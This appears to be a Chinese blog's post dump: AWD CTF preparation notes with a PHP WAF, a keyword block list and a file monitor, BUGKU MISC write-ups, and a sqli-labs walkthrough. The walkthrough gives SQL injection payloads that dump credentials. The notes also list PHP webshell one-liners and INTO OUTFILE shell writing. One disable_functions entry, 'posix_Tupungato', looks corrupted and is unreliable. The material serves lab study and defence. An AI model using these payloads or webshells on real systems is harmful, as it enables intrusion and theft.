5、后门利用我们猜想其他很多人也应该有这个被按的不死马漏洞，那就利用一下吧。菜刀连一下，然而试了好多都没有连上。。。不知什么原因。也许是因为本小白太菜了。。。 6、攻击本小白太垃圾了，还没学会。会个SQL注入，结果好像也没用到。还有个一句话木马。 并且，连怎么攻击都不知道。。。。。。我果然够菜！ 漏洞类型：sqli居多、文件包含、各种rce、文件上传 感悟这次参加线下赛收获了好多关于线下赛的知识，体验了一次线下赛的感觉。游戏体验还行，两个私地，基本上防住了一个。遗憾的是，没有借此机会，认识一些大佬。。希望自己再接再励。。 小白进阶ing。。。。","categories":[{"name":"线下赛","slug":"线下赛","permalink":"https://qwzf.github.io/categories/线下赛/"},{"name":"AWD","slug":"线下赛/AWD","permalink":"https://qwzf.github.io/categories/线下赛/AWD/"}],"tags":[{"name":"ISCC","slug":"ISCC","permalink":"https://qwzf.github.io/tags/ISCC/"},{"name":"感悟","slug":"感悟","permalink":"https://qwzf.github.io/tags/感悟/"}],"author":"qwzf"},{"title":"CTF线下赛AWD攻防准备","slug":"CTF线下赛AWD攻防准备","date":"2019-06-19T11:45:58.200Z","updated":"2020-08-01T16:12:55.310Z","comments":true,"path":"2019/06/19/CTF线下赛AWD攻防准备/","link":"","permalink":"https://qwzf.github.io/2019/06/19/CTF线下赛AWD攻防准备/","excerpt":"","text":"最近发现一篇博客。感觉对CTF线下赛-AWD模式，总结比较好。于是学习了解了一下，为了方便寻找，把这篇博客复制了过来，并补充了点。。。 1、赛制流程：攻防模式（AWD）常见于线下攻防一般比赛的具体环境会在开赛前半个小时由比赛主办方给出，前半个小时应熟悉配置环境。准备网线、网线转接口。 最好的防御就是攻击，不做好安全加固就会被吊打。 2、 赛前准备：常用工具：(整理适合自己的) Burpsuite sqlmap nmap、masscan nc D盾 Xshell、Xftp 菜刀或蚁剑 Chrome、Firefox各类插件 一句话木马： php asp aspx jsp 内存马 py库、脚本： pwntools requests 软waf 日志分析 Exp SSH客户端： PuTTY XShell 编辑器： Sublime VS Code Notepad++ Vim 个人知识库 常见应用源码库 Writeup集合 基础知识： 语言运用：编写自动化脚本等…… WEB安全：熟悉常见漏洞类型、常见框架…… pwn型：需要较好的底层基础、懂汇编等，需要理解各种堆栈溢出的原理、基础密码学…… 中间件：apache、nginx、tomcat、jboss、weblogic 语言基础：php、java、python 常见web应用：phpmyadmin、dedecms、phpcms、帝国cms、Discuz linux命令：netstat -tulpn 、ps -ef Gamebox: 系统：ubuntu、centos 中间件、版本： apache \\ nginx php \\ php-fpm tomcat \\ jboss \\ weblogic web程序 数据库： MySQL \\ MariaDB \\ Oracle Redis \\ MongoDB 3、常见加固方式：加固流程： 修改网站管理员密码 备份网站源码 tar -zcf /tmp/name.tar.gz /path/web tar -zcf /tmp/name.tar.gz /var/www/html 备份数据库 mysqldump -u 用户名 -p 数据库名 &amp;gt; 导出的文件名 mysqldump -u user -p database &amp;gt; /tmp/database.sql 修改ssh密码（即修改当前用户密码） 修改MySQL密码 set password for 用户名@localhost = password(&#39;新密码&#39;); set password for user@localhost = password(&#39;123&#39;); 修改MongoDB密码（27017端口） 修改Redis密码（6379端口） 修改网站源码中的数据库连接配置 部署waf（视情况而定） 准备一个软waf 如何使用phpwaf.php 找到CMS/框架通用配置文件进行包含： PHPCMS V9：\\phpcms\\base.php PHPWIND8.7：\\data\\sql_config.php DEDECMS5.7：\\data\\common.inc.php DiscuzX2：\\config\\config_global.php WordPress：\\wp-config.php Metinfo：\\include\\head.php 修改php.ini文件后重启（高权限）: 禁用敏感函数： disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname 自动包含waf：auto_prepend_file = safe.php路径; 分析日志文件 文件监控 准备一个脚本，监控并删除所有新增文件。 发现内存马，直接重启php。 若监控脚本无法使用，使用命令定期查看新增与修改文件。 find web路径 -ctime -1 （查看最近一日新增的文件，是否可疑） 修改目录权限：(可能会违规) chmod -R 644 www waf脚本 &lt;?php //部署waf可能会导致服务不可用，需要谨慎部署。 error_reporting(0); define(&#39;LOG_FILENAME&#39;,&#39;log.txt&#39;); function waf() { if (!function_exists(&#39;getallheaders&#39;)) { function getallheaders() { foreach ($_SERVER as $name =&gt; $value) { if (substr($name, 0, 5) == &#39;HTTP_&#39;) $headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] = $value; } return $headers; } } $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; $method = $_SERVER[&#39;REQUEST_METHOD&#39;]; $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;]; //rewirte shell which uploaded by others, you can do more foreach ($_FILES as $key =&gt; $value) { $files[$key][&#39;content&#39;] = file_get_contents($_FILES[$key][&#39;tmp_name&#39;]); file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;virink&quot;); } unset($header[&#39;Accept&#39;]);//fix a bug $input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header); //deal with $pattern = &quot;select|insert|update|delete|and|or|\\&#39;|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;; $pattern .= &quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;; $pattern .=&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;; $pattern .=&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;; $vpattern = explode(&quot;|&quot;,$pattern); $bool = false; foreach ($input as $k =&gt; $v) { foreach($vpattern as $value){ foreach ($v as $kk =&gt; $vv) { if (preg_match( &quot;/$value/i&quot;, $vv )){ $bool = true; logging($input); break; } } if($bool) break; } if($bool) break; } } function logging($var){ file_put_contents(LOG_FILENAME, &quot;\\r\\n&quot;.time().&quot;\\r\\n&quot;.print_r($var, true), FILE_APPEND); // die() or unset($_GET) or unset($_POST) or unset($_COOKIE); } waf(); ?&gt; 文件监控脚本 # -*- coding: utf-8 -*- #use: python file_check.py ./ import os import hashlib import shutil import ntpath import time CWD = os.getcwd() FILE_MD5_DICT = {} # 文件MD5字典 ORIGIN_FILE_LIST = [] # 特殊文件路径字符串 Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39; bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39; logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39; webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39; difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39; Special_string = &#39;drops_log&#39; # 免死金牌 UNICODE_ENCODING = &quot;utf-8&quot; INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot; # 文件路径字典 spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str)) Special_path = { &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)), &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)), &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)), &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)), } def isListLike(value): return isinstance(value, (list, tuple, set)) # 获取Unicode编码 def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=&quot;ignore&quot;) # 目录创建 def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise # 获取当前所有文件路径 def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist # 计算机文件MD5值 def calcMD5(filepath): try: with open(filepath,&#39;rb&#39;) as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass # 获取所有文件MD5 def getfilemd5dict(filelist = []): filemd5dict = {} for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict # 备份所有文件 def backup_file(filelist=[]): # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path[&#39;bak&#39;]) if __name__ == &#39;__main__&#39;: print u&#39;---------start------------&#39; for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u&#39;[*] pre work end!&#39; while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, &#39;r&#39;).read() except Exception, e: break if Special_string not in f: try: print u&#39;[*] webshell find : &#39; + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;)) except Exception as e: print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath) try: f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;) f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\\n&#39;) f.close() except Exception as e: print u&#39;[-] log error : file move error: &#39; + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, &#39;r&#39;).read() except Exception, e: break if Special_string not in f: try: print u&#39;[*] file had be change : &#39; + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;)) shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey) except Exception as e: print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey) try: f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;) f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\\n&#39;) f.close() except Exception as e: print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey) pass time.sleep(2) # print &#39;[*] &#39; + getUnicode(time.ctime()) 4、攻防演练：如何获得flag？在实际比赛中，一般有两种方式获取flag，一种是先获取webshell权限，然后去读flag文件，另一种则是直接通过漏洞读取flag文件。 Getshell： 官方后门、文件上传 文件写入、文件包含 命令注入、反序列化 Redis写shell Mysql写shell 直接读文件： SSRF 任意文件读取 XXE 文件包含 Sqli 1. web后门：在任意APP的某个文件的源码中加上一句话后门。 @eval($_POST[‘XXX’]); @assert($_POST[‘XXX’]); system($_REQUEST[‘CMD’]); 对于这种类型的漏洞，只要用正则遍历匹配就能找到grep -r &quot;eval\\(\\$_&quot;或者还有一些复杂变异的后门，这种情况就可以选择使用D盾Webshell查杀或者SafeDog之类的工具对源码进行扫描。只要删掉就可以解决。 2. 系统后门 NC后门 SSH后门 suid后门 3. webshell： 内存马：不断生成shell文件 Webshell密码：给Webshell增加密码，增加一个password参数MD5 4. 文件上传： put方法： Tomcat远程代码执行漏洞分析(CVE-2017-12615) 一般上传： 各种绕过方式一定要熟悉 常见改包、解析漏洞、图片渲染、逻辑文件（双文件上传）、条件竞争 防护方式——白名单、禁止上传目录执行权限、上传于Web目录外 5. 文件写入： 缓存： 存在缓存机制，后缀名为php，直接代码执行。 -配置文件： 单引号内：输入单引号，尝试逃逸。如&#39;+@phpinfo()+&#39; 双引号内：输入会被解析的符号。如${@phpinfo()} 模板文件： 模板被包含，getshell。 创建新文件时无校验后缀名。 日志： 日志以php后缀保存，X-Forwarded-For来伪造ip植入木马。 6. 命令注入/反序列化：PHP中使用unserialize函数对数据进行反序列化，反序列化过程类的wakeup方法与destruct方法会被调用。 &lt;?php class TestClass { public $variable; public function __destruct() { print_r(shell_exec(&quot;ping &quot;.$this-&gt;variable)); } } unserialize($_GET[&#39;data&#39;]); ?&gt; 7. 文件读取： SSRF：存在服务器请求伪造漏洞时，可使用file协议读取本地文件。 http://127.0.0.1/read.php?url=file:///flag SQL注入：目标存在SQL注入时，可尝试直接读取flag。 常规注入、盲注、二次注入、insert注入、http头注入 读取select load_file() 写入select outfile()select dumpfile() 8. 困难漏洞：有时候出题者会直接丢一个0day，现场审计。找不到漏洞没关系，上Waf保平安，时刻关注你的日志记录，NPC也会打出攻击流量。 找到别人写在自己服务器上的shell，一般其他服务器也会有，可以去留后门。 Collected by 此名如此彪悍 如有侵权，请敬请告知！！联系方式qq：1739381035","categories":[{"name":"线下赛","slug":"线下赛","permalink":"https://qwzf.github.io/categories/线下赛/"},{"name":"AWD","slug":"线下赛/AWD","permalink":"https://qwzf.github.io/categories/线下赛/AWD/"}],"tags":[{"name":"准备","slug":"准备","permalink":"https://qwzf.github.io/tags/准备/"}],"author":"qwzf"},{"title":"BUGKU做题总结(一)","slug":"BUGKU做题总结(一)","date":"2019-06-18T13:11:11.134Z","updated":"2019-07-31T16:16:47.809Z","comments":true,"path":"2019/06/18/BUGKU做题总结(一)/","link":"","permalink":"https://qwzf.github.io/2019/06/18/BUGKU做题总结(一)/","excerpt":"","text":"最近抽出一点时间练了一些BUGKU练习平台的MISC题，又学到了一些知识，感觉很好。现在总结一下当时没有立刻做出的、并有的借鉴大佬的题，加深加深自己的做题印象。 MISC1(啊哒)本题主要是数据隐藏 先看题目 额，没什么有用信息。那下载题目文件，发现是压缩包。用winrar打开，发现了一张jpg图片。 图片。。。一般遇到图片，先查看属性看是否有隐藏信息。然后用winhex打开，我发现这个地方竟如此可疑。 当然，用记事本打开会更加明显，亲测。。。很明显这是十六进制，十六进制转字符串一波走起。。 提交然而并不对。于是思考尝试后发现ada.jpg用winrar打开 很明显，刚才得到的字符串应该就是这个加密文件的密码了。果然如此，输入密码解压文件得到 MISC2(宽带信息泄露)本题主要是查看路由器备份的配置文件 看题目提示，emmm。。题目看起来似乎好难。下载题目文件。只有一个conf.bin文件，并且打不开。分析工具用了一波，然而并没有获取到有用信息。。。。于是查百度、查谷歌。。 了解到：路由器备份的配置文件一般是.bin格式，默认名称通常是conf.bin，通常用“RouterPass”路由器工具打开bin文件。 于是当然是下载工具了。下载后打开题目文件 然后不断翻找有用信息，发现宽带用户名了。。。 然后按格式提交就行了。。。 MISC3(come_game)本题主要是脑洞和信息发现 看题目了解到，这道题应该是和游戏有关，并且要通关才有flag。下载题目文件，解压，得到一个.exe可执行文件。运行，发现果然这是个游戏。。。。 在玩之后发现，生成了名字为save1、temp、DeathTime三个文件。分别用notepad++打开后发现，save1有点特殊 想到可能这个2，就是通关关卡数，改为5，打开游戏。果然如此，通关获取到flag了！。。 解题完毕，此题结束。。 MISC4(linux)本题主要是linux系统的常用命令使用 看到题目，了解到需要linux系统的命令操作。好在我提前已经装过linux虚拟机。那先了解一下linux常用基础命令 ||Linux基础命令吧。 了解完之后，开始继续做题吧！下载题目文件，得到1.tar .gz。打开发现文档flag。所以用cat由第一行开始显示档案内容。 这个就应该是所谓的flag了。。。提交，果然是。 MISC5(做个游戏(08067CTF))本题主要是java反编译 看题目的意思知道，这道题又是一个游戏，并且要求坚持60秒才有flag。然后下载文件，然后打开，发现果然是个游戏。那就开始玩吧。。移动白色方块，避免被撞击，发现可以移动到永远不被撞击的地方哎。然而，等了60秒并没有什么用。。。。 然后，想其他方法了。发现heiheihei.jar用winrar打开，发现了一些图片。 于是我尝试只留第一张，其他全移走。结果发现 显示flag了，然而并没有完全显示完。emmmmm。。。。。既然显示了，那应该在java程序中能找到。百度或谷歌一下，发现有个java反编译工具JD-GUI。下载用下，然而我不知什么原因，并没有下载成功。于是下载了相似工具。用java反编译工具直接打开jar文件，发现并没有有用信息。于是先用winrar打开jar文件，用java反编译工具打开相应组成文件。。。发现flag了。。。 直接提交，发现并不对，发现花括号里的应该Base64加密了。解密后提交，成功了。 MISC6(想蹭网先解开密码)本题主要是了解wifi认证WPA的四次握手包，并根据已给信息生成密码字典破解密码。 了解：wifi握手包,即采用WPA加密方式的无线AP与无线客户端进行连接前的认证信息包 这道题我参考了大佬的博客做的。了解到通过握手包(此题是wifi.cap)便可以对密码进行暴力猜解。题目已经给了前七位。那由此生成一个密码词典吧！于是找了个脚本: 生成字典文件 f=open(&#39;pass.txt&#39;,&#39;w&#39;) for i in range(0,10000): psd=&#39;1391040&#39;+str(i).zfill(4) f.write(psd+&#39;\\n&#39;) 然后用到软件 EWSA导入字典文件，进行暴力猜解，就行了。 emmmm。。。星号是什么鬼。。。不知到怎么才能显示。换另一种方式解题吧。。。。不想叙述了，有个大佬总结的比较详细，可以参考一下。。还有个linux系统的解题方式吧。 总结结束，参考一些知识和大佬的博客，又收获了好多。。继续努力。。。小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"BUGKU","slug":"BUGKU","permalink":"https://qwzf.github.io/tags/BUGKU/"}],"author":"qwzf"},{"title":"sqli-labs攻关1(Less-1_Less-6)","slug":"sqli-labs攻关1(Less-1_Less-6)","date":"2019-06-10T11:03:52.130Z","updated":"2020-08-01T16:55:42.335Z","comments":true,"path":"2019/06/10/sqli-labs攻关1(Less-1_Less-6)/","link":"","permalink":"https://qwzf.github.io/2019/06/10/sqli-labs攻关1(Less-1_Less-6)/","excerpt":"","text":"前言为了更好的学习和练习有关SQL注入的知识,于是我开启了sqli-labs的通关之路。。。。 为了方便学习查看，我在源码中的$sql下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的） echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&lt;br&gt;&quot;; 在开始注入之前，我学习了下面这些相关sql注入基础知识。 sql注入基础知识1.判断是否存在sql注入1、get 单引号判断?id=1&#39; 如果报错说明存在sql注入输入?id=1显示正常输入?id=1&#39;显示错误，所以就存在sql注入&#39;的url编码是%27 2、get and判断输入?id=-1&#39;and 1=1 正常输入?id=-1&#39;and 1=2 报错如果报错，那就存在sql；但由于mysql版本问题，2个都存在报错，所欲还是要看具体报错。才能更具报错内容进一步判断是否存在sql注入。 3、Or、xor判断or xor方法和and方法一致。4、sql运算符判断输入?id=5-0输入?id=5-1输入?id=5+1通过匹对获取到的内容是否一致，不一致代表存在sql注入； 5、通过sleep函数演示显示的形式进行判断payload ?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+ 表示5秒后响应内容 6、服务端返回错误形式错误直接回显在页面上错误隐藏在页面源代码中检测到错误跳转到另一个页面返回HTTP错误代码500或重定向302适当处理错误结果，常显示一个通用错误页面 2.post、get、编码常用&#39;or and 1=1 # &#39;or and 1=1 –-+ #是sql语句中的注释符； + 在http请求中表示空格； -- 后面的语句相当于被注释掉,不执行后面的sql语句； --+代表闭合sql查询语句，如果没加，无法形成有效的mysql语句，这是sql注入中常见的巧妙运用。 在post参数中要加空格符，直接输入空格服即可；用+会被http请求转义为%2B编码；在get请求中在get请求中如果有空格，需要用空格符编码%20来替代，不然会请求报错；如果用#表示不提交#后面的参数到服务端，但是转成%23编码就可以提交过去；常见URL编码空格 %20 +%2b &lt;%3c &gt;%3e 更多参考https://www.w3school.com.cn/tags/html_ref_urlencode.html或者工具查询https://tool.chinaz.com/tools/urlencode.aspx 神奇的编码可以进行各种绕过！！ 3.sql注入常用mysql函数1、order by该函数用于对结果集进行排序，主要用于猜字段。例如我们在实验室less-1输入?id=1要确定它里面有多少个字段，就要用到order by了例如输入?id=1 order by 3 --+ 显示正常再次输入?id=1 order by 4 --+ 显示错误所以的出，在?id=1查看的这个表有3个字段 2、unionunion在sql注入测试过程中，几乎经常用到，进行联合查询 例：?id=-1&#39; union select 1,user(),database() --+ 3、MIDSELECT MID(ColumnName, Start [, Length]) FROM TableName4、LEFT(str,len)返回字符串str的最左面len个字符5、ASCII(str) =ORD返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL6、SUBSTR(str,pos,len)从str中多少个字符开始，截取多少位7、CASTSELECT CAST(’12’ AS int) 将目标str转化为目标数据类型8、IFNULL(expr1,expr2)如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr29、updatexml()updatexml(1,concat(0x7e,user(),0x7e),1)其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误显示user()该函数。但显示出来的内容最多只有32个字符串；利用原理对他是对XML文档进行更新的函数；语法：updatexml(目标xml文档，xml路径，更新的内容)10、extractvalue()extractvalue也是运用于报错sql注入；利用原理对XML文档进行查询的函数；语法：extractvalue(目标xml文档，xml路径)熟悉mysql常见的判断语句函数参考文章https://www.runoob.com/mysql/mysql-functions.html11、LOAD_FILE可以利用该函数，进写入shell用法：select load_file(‘file1’) into outfile ‘file2’将file1的文件导入WEB目录file2的文件中进行访问！ 例： ?id=1’)) union select 1,2,’&lt;?php* [@eval](http://github.com/eval)*($_POST[“cmd”]);?&gt;’ into outfile “/home/wwwroot/default/test.php”—+* 看完后，有了大致了解，是时候开启注入攻关之旅了。。 一、错误型-GET注入大致思路：闭合-&gt;输入sql查询(这里是联合查询)语句-&gt;注释后边条件 因为错误型GET注入过于基础，所以这一部分直接构造payload，开始注入了。。 1、Less-1错误型GET单引号字符型注入单引号字符型注入：通过&#39;的报错进行sql查询，并用mysql能输出字符串型的函数，获取我们想要的数据。 1、发现注入点 输入?id=1 正常； 输入?id=1&#39; 报错，就存在sql注入漏洞。 2、猜id=1显示条件中表的字段 例如输入?id=1&#39; order by 3 --+ 显示正常再次输入?id=1&#39; order by 4 --+ 显示错误 所以我得出，在?id=1查看的这个表有3个字段 3、爆数据库 payload ?id=-1&#39; union select 1,2,database() --+ 4、爆数据表 payload ?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 5、爆数据列(字段) payload ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+ 6、爆数据值 payload ?id=-1&#39; union select 1,group_concat(username,0x3a,password),3 from users--+ 要点1、union select 1,group_concat(table_name),3?id=-1等于我们要查询的表，在实验第一步时候，我们得到该查询的表有3个字段；所以我们在构建select时候，必须满足3个字段条件；例如：select 1,2,3 那么 group_concat(table_name)表示2；这点有点像数组，你必须规定3个值，才能进行正常的赋值后显示。 2、group_concat()group_concat函数是典型的字符串连接函数； 3、0x3a0x3a是:16进制的分隔符,比如在爆开数据值使用中(username,0x3a,password)表示(username:password) 4、information_schema表示存储了数据表tables 列columns的元数据信息;用法：常规的sql查询中from xxx查询的元素或表 where xxx查询的条件；5、database()列出数据库的库名；6、table_schema=database()累出数据库的表名，这里存在赋值 2、Less-2错误型GET整型注入整型注入：提交的URL参数为整数类型 与Less-1错误型GET单引号字符型注入 区别在于，构建payload时去掉&#39;单引号 1、爆数据库 payload ?id=-1 union select 1,2,database() --+ 2、爆数据表 payload ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 3、爆数据列(字段) payload ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+ 4、爆数据值 payload ?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+ 3、Less-3错误型GET单引号变形字符型注入常见SQL变形字符串注入： 将查询条件转为base64 本实验用)来实现变形； 宽字节字体编码利用，例如gbk中文字符，这种比较难用；例如试图用%df%5c%27试图在%df%5c%27为中文字符绕过%27PHP魔术引用的转义成\\%27但也要取决于环境；故此宽字节去做sql注入的转义绕过很难。 与Less-2错误型GET整型注入区别在于，构建payload新增&#39;)单引号，)表示变形！ 1、爆数据库 payload ?id=-1&#39;) union select 1,2,database() --+ 2、爆数据表 pyload ?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 3、爆数据列(字段) payload ?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+ 4、爆数据值 payload ?id=-1&#39;) union select 1,group_concat(username,0x3a,password),3 from users--+ 4、Less-4错误型GET双引号字符型注入与Less-3错误型GET单引号变形字符型注入区别在于，构建payload更改为&quot;)双引号；)表示变形 1、爆数据库 payload ?id=-1&quot;) union select 1,2,database() --+ 2、爆数据表 payload ?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 3、爆数据列(字段) payload ?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+ 4、爆数据值 payload ?id=-1&quot;) union select 1,group_concat(username,0x3a,password),3 from users--+ 二、双查询注入(报错注入)-GET注入双注入： 双注入就是嵌套子查询。 多走一条查询或者数据排序途径，获取想要的数据,例如select …(select …)，里面的那个select被称为子查询，它的执行顺序先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数利用： rand()随机函数，返回0~1之间的某个值floor(a)取整函数，返回小于等于a，且值最接近a的一个整数count()聚合函数也称作计数函数，返回查询对象的总数group by cluase分组语句，按照cluase对查询结果分组 原理： 当一个字符串函数，例如concat函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 5、Less-5双注入GET单引号字符型注入先尝试一下?id=-1&#39; union select 1,2,database() --+进行爆库，发现报错了,但是union没有出结果。 于是查询了一些相关知识和大佬的博客后。有了大致思路。 首先，查看一下源码 查询后发现：mysql_error() 函数返回上一个 MySQL 操作产生的文本错误信息。如果没有出错则返回 ‘’（空字符串）。 这样的话只能采取报错注入了。下面是我参考大佬博客得到的知识： (1)通过floor报错 and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a) 其中payload为你要插入的SQL语句 需要注意的是该语句将 输出字符长度限制为64个字符 (2)通过updatexml报错 and updatexml(1,payload,1) 同样该语句对输出的字符长度也做了限制，其最长输出32位 并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 (3)通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。 payload即我们要输入的sql查询语句floor报错注入即双查询注入 双注入的原理总的来说就是，当一个聚合函数后面出现group分组语句时，会将查询的一部分结果以报错的形式返回，他有一个固定的公式。 ?id=1&#39; union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23 ?id=1&#39; union select count(*),1, concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a%23 ?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a--+ ?id=-1&#39; and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ 这些理解之后，就可以愉快的爆库、爆表、爆字段、报内容了。。。 1、爆数据库 payload ?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 爆数据用户,将mysql系统函数database()改为user()即可。 2、爆数据表 当我尝试把爆数据库的payload改为爆数据表的payload时 ?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 发现 意思就是一次只能返回不超过一条数据。所以此时我使用limit进行限制 payload ?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+ 